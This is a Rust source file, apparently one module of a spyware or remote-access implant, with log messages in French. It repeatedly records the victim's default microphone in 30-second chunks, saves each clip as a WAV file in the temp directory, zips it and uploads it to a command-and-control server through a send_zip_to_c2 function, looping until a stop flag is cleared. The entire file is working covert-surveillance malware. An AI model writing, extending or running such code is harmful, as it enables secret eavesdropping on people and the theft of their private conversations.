use anyhow::Result;
use chrono::Local;
use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};
use hound::{WavSpec, WavWriter};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex, OnceLock};
use std::time::Duration;
use tokio::sync::Mutex as AsyncMutex;

use crate::connexion::{send_zip_to_c2, zip_file};

pub enum MicRecStatus {
    Idle,
    Running,
}
static MIC_REC_STATE: OnceLock<Arc<tokio::sync::Mutex<MicRecStatus>>> = OnceLock::new();

static MIC_REC_FLAG: OnceLock<Arc<AtomicBool>> = OnceLock::new();

fn build_temp_wav_path() -> PathBuf {
    let filename = Local::now()
        .format("mic_recording_%d-%m-%Y_%H-%M-%S.wav")
        .to_string();
    let mut path = std::env::temp_dir();
    path.push(filename);
    path
}

pub async fn record_mic(duration_secs: u64) -> Result<()> {
    let host = cpal::default_host();

    let device = host
        .default_input_device()
        .ok_or_else(|| anyhow::anyhow!("No input device available"))?;

    let config = device.default_input_config()?;

    let spec = WavSpec {
        channels: config.channels(),
        sample_rate: config.sample_rate().0,
        bits_per_sample: 16,
        sample_format: hound::SampleFormat::Int,
    };

    let wav_path = build_temp_wav_path();
    let writer_sync = Arc::new(Mutex::new(Some(WavWriter::create(&wav_path, spec)?)));
    let writer_async = Arc::new(AsyncMutex::new(writer_sync.clone()));
    let writer_clone = writer_sync.clone();

    let err_fn = |err| eprintln!("an error occurred on stream: {}", err);

    let stream = match config.sample_format() {
        cpal::SampleFormat::I16 => device.build_input_stream(
            &config.into(),
            move |data: &[i16], _| {
                let mut guard = writer_clone.lock().unwrap();
                if let Some(writer) = guard.as_mut() {
                    for &sample in data {
                        writer.write_sample(sample).unwrap();
                    }
                }
            },
            err_fn,
            None,
        )?,
        cpal::SampleFormat::U16 => device.build_input_stream(
            &config.into(),
            move |data: &[u16], _| {
                let mut guard = writer_clone.lock().unwrap();
                if let Some(writer) = guard.as_mut() {
                    for &sample in data {
                        let sample_i16 = (sample as i32 - 32768) as i16;
                        writer.write_sample(sample_i16).unwrap();
                    }
                }
            },
            err_fn,
            None,
        )?,
        cpal::SampleFormat::F32 => device.build_input_stream(
            &config.into(),
            move |data: &[f32], _| {
                let mut guard = writer_clone.lock().unwrap();
                if let Some(writer) = guard.as_mut() {
                    for &sample in data {
                        let sample_i16 = (sample * i16::MAX as f32) as i16;
                        writer.write_sample(sample_i16).unwrap();
                    }
                }
            },
            err_fn,
            None,
        )?,
        _ => return Err(anyhow::anyhow!("Unsupported sample format")),
    };

    stream.play()?;
    println!("[MIC] Stream démarré, enregistrement en cours...");
    tokio::time::sleep(Duration::from_secs(duration_secs)).await;
    println!("[MIC] Délai de 30 sec terminé, arrêt du stream...");
    drop(stream);

    println!("[MIC] Finalisation du fichier...");
    let writer_sync = writer_async.lock().await;
    println!("[MIC] Lock acquis sur le writer");
    {
        let mut guard = writer_sync.lock().unwrap();
        if let Some(writer) = guard.take() {
            println!("[MIC] Finalisation du WAV...");
            writer.finalize()?;
            println!("[MIC] WAV finalisé");
        }
    }

    println!("[MIC] Création du ZIP...");
    let zip_file = zip_file(&wav_path).await?;
    let zip_path = zip_file.path();
    println!("[MIC] ZIP créé: {:?}", zip_path);

    println!("[MIC] Envoi du ZIP au C2...");
    let _ = send_zip_to_c2(zip_path).await;
    println!("[MIC] ZIP envoyé au C2");

    Ok(())
}

pub fn init_mic_rec_flag() -> Arc<AtomicBool> {
    MIC_REC_FLAG
        .get_or_init(|| Arc::new(AtomicBool::new(true)))
        .clone()
}

pub fn stop_mic_rec() {
    if let Some(flag) = MIC_REC_FLAG.get() {
        println!("[MIC_FLAG] Arrêt demandé");
        flag.store(false, Ordering::SeqCst);
    }
}

pub async fn mic_rec_loop(flag: Arc<AtomicBool>) -> anyhow::Result<()> {
    while flag.load(Ordering::SeqCst) {
        println!("[MIC] Enregistrement de 30 secondes");
        record_mic(30).await?;
        println!("[MIC] Pause de 5 secondes avant prochain enregistrement");
        for _ in 0..5 {
            if !flag.load(Ordering::SeqCst) {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
        }
    }
    println!("[MIC] Boucle d'enregistrement arrêtée proprement");
    Ok(())
}

pub fn init_mic_rec_state() -> Arc<tokio::sync::Mutex<MicRecStatus>> {
    MIC_REC_STATE
        .get_or_init(|| Arc::new(tokio::sync::Mutex::new(MicRecStatus::Idle)))
        .clone()
}
